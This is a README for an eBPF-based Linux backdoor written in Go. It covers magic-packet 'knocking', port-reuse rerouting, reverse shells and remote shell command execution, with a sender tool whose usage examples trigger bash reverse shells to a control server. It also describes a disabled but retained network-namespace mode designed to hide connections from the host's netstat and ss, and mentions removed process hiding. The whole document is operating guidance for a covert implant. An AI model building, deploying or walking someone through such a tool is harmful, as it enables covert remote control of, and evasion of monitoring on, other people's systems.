# ruport-go

基于 Golang + [cilium/ebpf](https://github.com/cilium/ebpf) 实现的端口复用控制程序，
是 [ruport](../ruport)（C + libbpf）的功能等价移植。

仅支持 Linux（Debian/Ubuntu 系发行版）。**不要在 Windows 下编译**，构建与测试需在
Linux 上执行 `make`。内核版本要求与"一次编译、跨发行版运行"的适应性说明见
[内核要求与一次编译的适应性](#内核要求与一次编译的适应性)。

## 功能

与原 ruport 项目一致：

- **XDP 程序**（SKB 模式，`XDP_PASS` 不影响正常业务）：解析网卡上的 IPv4/TCP 包，
  识别 TCP payload 前 12 字节魔术标记（`s1² + s2² = s3`，小端），命中后解析 124
  字节指令消息（`ins/cip/cport/connport/nativeport/ext[100]`），以
  `(cip<<16)+cport` 为 key 存入 `message_map`；
- **TC 程序**（clsact，ingress + egress）：维护 `router_map`，入站命中路由时把
  目的端口改写为本地真实服务端口 `nativeport`（并更新校验和），出站命中时把源端口
  改写回出网端口 `connport`，实现端口复用；
- **控制程序 ruport**：每秒轮询 `message_map`，按指令添加/删除路由，执行反弹
  连接（bash / nc）、执行 shell 命令等功能；
- **指令发送端 c3**：构造同样的 124 字节魔术包发到被控端开放端口，
  命令行参数与原 `insTool/c3.py` 完全一致。

与原项目的差异（仅技术栈层面，不改功能语义）：

- 用户态由 C/libbpf 换成 Go + cilium/ebpf，skeleton 换成 bpf2go 生成的绑定；
- 经典 TC clsact 的挂载 cilium/ebpf 不直接提供，使用 vishvananda/netlink 创建
  qdisc/filter（等价于原 `bpf_tc_hook_create`/`bpf_tc_attach`，priority=1 handle=1）；
- pidhide（进程隐藏）在原项目 main() 中已注释禁用，本项目不移植；
  `-H` 参数仅为命令行兼容保留，无实际作用；
- `-p` 参数与原版一致：解析并校验，但不参与后续逻辑。

## 目录结构

```
bpf/                  eBPF C 源码（由 bpf2go 编译）
  common.h            Message/Router 结构与常量（对应原 types.h）
  ruport_xdp.bpf.c    XDP 指令嗅探（对应原 ruport.xdp.c）
  ruport_tc.bpf.c     TC 端口复用改写（对应原 ruport.tc.c）
internal/bpf/         bpf2go 生成的 Go 绑定（make generate 产生）+ 加载封装
internal/control/     指令处理（路由增删、反弹、shell 执行，对应原 ruport.c 逻辑）
cmd/ruport/           控制主程序
cmd/c3/               指令发送端（对应原 insTool/c3.py）
```

## 环境与编译

Ubuntu 24.04（已在原项目验证过的发行版）：

```bash
sudo apt install golang-go clang libbpf-dev make
```

（Go 版本需 >= 1.24，若仓库版本过旧请自行安装新版）

编译：

```bash
make
```

`make` 自动完成：`go mod tidy` -> `bpf2go` 编译 `bpf/*.bpf.c` 并在
`internal/bpf/` 下生成 Go 绑定 -> `go build` 产出 `ruport` 与 `c3`。

清理：

```bash
make clean
```

## 内核要求与一次编译的适应性

### 功能依赖清单

程序实际用到的 eBPF 功能及其主线内核最低版本（逐项核对自
`bpf/*.bpf.c`、`cmd/ruport/main.go`）：

| 功能 | 使用处 | 最低内核 |
|---|---|---|
| XDP 程序类型（generic/SKB 模式挂载） | `ruport_xdp.bpf.c` + `link.AttachXDP(GenericMode)` | 4.8 |
| TC（SCHED_CLS）程序类型 | `ruport_tc.bpf.c` | 4.1 |
| clsact qdisc（netlink 挂载） | `attachTcFilters`（egress/ingress filter） | 4.5 |
| `BPF_MAP_TYPE_HASH` | `message_map` / `router_map` | 3.18 |
| helper `bpf_map_lookup_elem` / `bpf_map_update_elem` | XDP/TC | 3.19 |
| helper `bpf_skb_store_bytes` / `bpf_l4_csum_replace` / `bpf_csum_diff` | TC 端口改写与校验和 | 4.1 |
| helper `bpf_trace_printk` | `bpfprint` 宏（license 已声明 GPL） | 4.1 |
| 程序自身 BTF 上载（`BPF_BTF_LOAD`，.o 以 `-g` 编译） | 加载时由 cilium/ebpf 提交 | 4.18 |
| XDP link 化挂载（可选路径） | `AttachXDP` 自动选择：5.8+ 走 link，老内核回退旧式 attach | 4.8 |
| memlock 解除 | `rlimit.RemoveMemlock()`（<5.11 必需，5.11+ 起 memcg 计费、调用无害） | — |

### 内核要求结论

- **理论最低**：4.8（上表最大值；4.8~4.17 区间依赖加载器在无 BTF
  syscall 时跳过程序 BTF，**未验证，不建议**）；
- **推荐基线**：**≥ 5.4**——主流发行版自此默认开启
  `CONFIG_DEBUG_INFO_BTF=y`，程序 BTF 上载无忧；
- 未使用 ringbuf / tcx / fentry / CO-RE 等高版本特性，无额外要求。

### Ubuntu 兼容矩阵

| 发行版 | 默认内核 | 运行 24.04 编译的二进制 | 说明 |
|---|---|---|---|
| Ubuntu 24.04 | 6.8（HWE 至 6.11） | ✅ 已验证口径（本项目开发/构建环境） | 构建与运行基线 |
| Ubuntu 22.04 | 5.15（HWE 至 6.8） | ✅ 满足自查条件即可运行 | 5.15 ≥ 5.4 基线，BTF 默认开启 |
| Ubuntu 20.04 | 5.4 | ⚠️ 理论可用，未实测 | 恰为基线版本；memlock 路径生效 |
| Ubuntu 18.04 | 4.15 | ❌ 不支持 | < 4.18，BTF 上载不可用，且未验证 |

### 为什么"一次编译、跨发行版运行"成立

1. **纯 Go 静态二进制**：控制端 `ruport` 与发送端 `c3` 均无 cgo /
   glibc 依赖，二进制与构建机发行版、libc 版本无关；
2. **eBPF 字节码内嵌且双端序**：bpf2go 默认生成 `bpfel` + `bpfeb`
   两套 `.o` 并按架构构建标签自动选用——同一个 `make` 产物在小端
   架构（amd64/arm64 等）通用；构建机 clang 版本不约束目标内核
   （BPF 指令集是稳定 ISA）；
3. **无 CO-RE 重定位**：程序只使用 UAPI 稳定结构（`iphdr/tcphdr`
   等），不读取内核内部结构体，因此**不依赖目标内核的 BTF**；
   仅程序自身 BTF 需要目标内核支持 `BPF_BTF_LOAD`（4.18+）；
4. **挂载自动适配**：XDP 在 5.8+ 自动走 link、老内核回退旧式
   attach；TC 走经典 clsact（4.5+ 无版本分歧）；<5.11 内核的
   memlock 已在代码中处理。

### 目标机运行前自查（三条命令）

```bash
uname -r                                   # 内核版本 ≥ 5.4（推荐基线）
ls -l /sys/kernel/btf/vmlinux              # 存在即可（程序 BTF 上载无忧）
sudo bpftool feature probe full | grep -E "xdp|clsact"   # 权限与能力最终确认
```

### 注意事项

- 需 **root**（或 `CAP_BPF` + `CAP_NET_ADMIN`，5.8+ 细分 capability）；
- XDP 使用 **generic/SKB 模式**，不挑网卡驱动（native 模式非必需）；
- 内核需启用 `CONFIG_BPF_SYSCALL`（Ubuntu 默认开启）；
- 与原 C 版一致，本程序未使用任何高版本特性作为前提；
- **网卡 TX 校验和卸载必须保持开启（系统默认）**：egress 方向只改写回包源端口、
  不修改 TCP 校验和（本机产生的包为 CHECKSUM_PARTIAL，由网卡对改写后的头部
  求和）。若执行 `ethtool -K <网卡> tx off`，回包校验和会出错、连接无法建立。

## 运行

```bash
sudo ./ruport -i eth0
```

- `-i` —— 网络接口名称。不指定时自动读取 `/proc/net/dev`，选择发送字节数最多的
  非 `lo` 网卡（与原版一致，可能获取不到，建议显式指定）；
- `-p` —— 端口（解析校验，不参与逻辑，兼容保留）；
- `-H` —— 兼容保留，无实际作用（原版 pidhide 已禁用）。

程序收到 SIGINT 时卸载 XDP 与 TC 挂载后退出。

指令发送（用法与原 c3.py 一致）。完整用法说明如下（同 `./c3 -h`）：

```text
**************************************************
工具说明：
**************************************************

控制端需要给被控端发送特定的指令来激活被控端的功能。
发送的数据主要为以下格式：(固定长度124个字节)
---------------------------------------------------------------------------
|  2  |  2  |      8       |  2  |   4   |  2  |  2  |  2  |     100      |
---------------------------------------------------------------------------
|<--------flag------------>| ins |--cip--|port | p1  | p2  |     ext      |

flag:   标记，被控端通过次标记来识别网络流是否属于控制端的指令。
        一共12个字节固定大小 a² + b² = c²， 表数据各种中存储的
        数据为a|b|c²

ins:    指令， 通过不同的指令实现对被控端的功能控制, 指令格式如下：
        -----------
        | 8  | 8  |
        -----------
        | H  | L  |

        指令分为2个字节，高字节和低字节。
        低字节(L): 低字节主要用于控制功能,如下：（十六进制数据表示)
            01: 只添加路由功能
            02: 反弹连接
            03: 执行shell命令
            04: 执行程序
        高字节(H): 目前高字节的数据没有特别具体的使用，不为空的情况下
            会删除

        指令：
            01: 只添加路由
            02: 反弹连接
                目前支持的反弹连接: bash和nc反弹
                自发送这个指令的时候，ext 扩展段必须指定是bash还是nc
            03: 执行shell命令
            04: 执行程序

cip:    控制服务器IP(必须)(网络字节序)
port:   控制服务器端口(必须)(网络字节序)
p1:     出网端口(必须)
p2:     功能端口(被控端实际与控制端通讯的本地程序功能端口)

整体的指令信息的长度为123个字节.

**************************************************
命令行：
**************************************************

-h:     帮助信息
-t:     目标地址
-p:     端口
-S:     控制服务器地址
-P:     控制服务器端口

-x:     对应p1
-y:     对应p2
-e:     对应扩展(ext)
-i:     指令(01, 02, 03, 04) 都是用十六进制的数据形式表示
-d:     删除操作(指令字段高位置1)
-1:     同 -i 01 路由
-2:     同 -i 02 反弹
-3:     同 -i 03 执行shell命令
-4:     同 -i 04 执行程序
-5:     同 -i 05 netns隐藏路由(服务器端已禁用，指令将被忽略并记录日志)


**************************************************
示例:
**************************************************
1.  c3 -t 192.168.1.2   -p 80      -1       -S 192.168.1.3    -P 3333    -x 80
       | 目标地址    |   |端口| |路由指令|   | 控制端IP      | |控制端口||被控端出网端口|
    // 发送 路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：3333 被控端出网端口 80

2.  c3 -t 192.168.1.2  -p 80      -2       -S 192.168.1.3  -P 2222    -x 80         -e bash
       | 目标地址    | |端口 |   |反弹指令| | 控制端IP     | |控制端口||被控端出网端口| |扩展数据|
    // 发送 bash反弹 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为：2222 被控制出网端口 80

3.  c3 -t 192.168.1.2  -p 80    -d       -1       -S 192.168.1.3  -P 3333     -x 80
       | 目标程序    | |端口 |  |删除|   |路由指令| | 控制端IP      | |控制端口||被控出网端口|

    // 发送 删除路由 指令到192.168.1.2的80端口，并指定控制服务器的IP为192.168.1.3 控制端口为: 3333 被控出网端口为 80

4.  c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333
    // 如果没有 -x 80 指定出网的端口，那么通讯用端口就是 -p 80 这个指定的端口

5.  c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 12345 -x 80 -y 22
    // 给被控制端添加路由，注意：必须指定出网端口(-x)和被控端本地端口(-y)

6.  c3 -t 192.168.1.2 -p 80 -5 -S 192.168.1.3 -P 3333 -x 80 -y 22 -e "sshd -D -p 22"
    // netns隐藏路由：被控端在独立网络命名空间内拉起服务并转发，
    // 宿主netstat不显示该连接；-e为ns内服务命令（可省略，前提ns内已有服务）

**************************************************
附加：
**************************************************
1. ssh 通过nc代理连接
	ssh -o ProxyCommand='ncat -x 127.0.0.1:1081 -p 12345 %h %p ' username@192.168.1.2 -p 80
    // ssh通过ncat的代理连接远程服务器的80端口，并且通过-p来指定ncat出网的端口
```

常用命令速览：

```bash
# 添加路由：目标 192.168.1.2:80，控制端 192.168.1.3:3333，出网端口 80，功能端口 22
./c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333 -x 80 -y 22

# bash 反弹
./c3 -t 192.168.1.2 -p 80 -2 -S 192.168.1.3 -P 2222 -x 80 -e bash

# 删除路由
./c3 -t 192.168.1.2 -p 80 -d -1 -S 192.168.1.3 -P 3333 -x 80
```

nc 反弹要求被控端程序同目录下存在 `nc` 可执行文件（与原版一致）。

## netns 隐藏模式（**已禁用，代码保留**）

> **状态：2026-08-30 起禁用。** 原因：宿主转发依赖 iptables FORWARD 链放行
> （Docker 等环境默认 DROP），且引入的系统状态面较大（netns/veth/
> ip_forward/路由），局限与风险偏高。代码完整保留，将 `internal/control`
> 中 `NetnsDisabled` 置为 `false` 重新编译即可恢复启用（届时需处理
> FORWARD 放行，详见设计文档）。`--ns-destroy` 参数保持可用，用于清理
> 历史测试残留。以下内容保留作设计参考：

默认（01 路由）模式下，改写后的连接在**宿主** `netstat -an` 中仍以真实四元组
可见（`:22 ↔ 控制端:3333`）——TC 层 NAT 改变不了内核 socket 表。若要求宿主
常规巡检也无痕，用 **05 指令（netns 隐藏路由）**：隐藏服务运行在独立网络
命名空间内，TC 升级为 L3+L4 NAT（目的/源 IP+端口一并改写），流量经 veth
**纯转发**，宿主上不创建任何 socket。设计与边界详见
[doc/design/01-netns-hidden-service.md](doc/design/01-netns-hidden-service.md)。

**模式由敲门指令动态决定，ruport 启动时无需选择**（两种模式可在同一进程
生命周期内切换，不同 源ip:port 的表项互不影响）：

```bash
# 服务器：正常启动即可
sudo ./ruport -i ens33

# 场景一：普通模式（宿主可见）—— 01 指令
./c3 -t <服务器IP> -p 80 -1 -S <控制端IP> -P 3333 -x 80 -y 22
ssh -o "ProxyCommand=nc -p 3333 %h %p" user@<服务器IP> -p 80

# 断开后切换：先删旧表项（同一 源ip:port 已有表项时，新敲门不生效）
./c3 -t <服务器IP> -p 80 -d -1 -S <控制端IP> -P 3333 -x 80 -y 22

# 场景二：netns 隐藏模式（宿主 netstat 无痕）—— 05 指令，服务命令随指令下发
./c3 -t <服务器IP> -p 80 -5 -S <控制端IP> -P 3333 -x 80 -y 22 -e "sshd -D -p 22"
ssh -o "ProxyCommand=nc -p 3333 %h %p" user@<服务器IP> -p 80

# 验证：宿主 netstat -an | grep 3333 与 ss -tn | grep :22 均为空；
# ns 内可见真实四元组：sudo ip netns exec ruport_ns ss -tn

# 结束：-d 删除最后一条 netns 路由后自动清场（停服务、拆 ns、恢复 ip_forward）；
# ruport 退出（Ctrl+C）同样自动清场；--ns-destroy 仅用于异常残留（如 kill -9 后）
```

服务命令（`-e`）按空格切分、不走 shell，须前台运行（如 sshd 的 `-D`）；
同命令字符串去重复用，不会重复起进程；`-e` 可省略（前提 ns 内已有服务
在跑，比如先用一次 05 拉起、后续只敲门路由）。

**生命周期（清场语义）**：`-d` 删除某条 netns 路由后，若表中已无其他
netns 表项（其他 源ip:port 的隐藏连接不受影响），自动停止 ns 内服务、
拆除 veth/netns 并恢复 `ip_forward`；ruport 退出时同样完整清场；
下一条 05 指令会自动重建（幂等，服务重拉约几百毫秒）。

启动参数（均可选，仅作预热）：`-N` 启动即建 ns（否则首条 05 指令时懒建）；
`--exec` 预拉默认服务；`--ns-name`（默认 ruport_ns）；`--ns-subnet`（默认
192.0.2.0/24，.1 网关 / .2 服务）；`--ns-destroy` 销毁 netns/veth 后退出。

注意事项：

- 若宿主 iptables/nftables 的 FORWARD 链为 DROP，转发进 ns 的包会被丢
  （启动与 05 指令处理时会打印提示），需自行放行 veth 转发；
- 服务进程在宿主 `ps` 中仍可见、登录仍写 `/var/log/auth.log`——本模式
  解决的是 netstat/ss 层面的可见性，不是完全隐形；
- 原宿主 sshd 与 ns 内 sshd 可并存（协议栈隔离，端口不冲突）；
- 旧 C 版 ruport 收到 05 指令会忽略（无副作用），Go 版 c3 发 01 指令行为
  与原先完全一致。
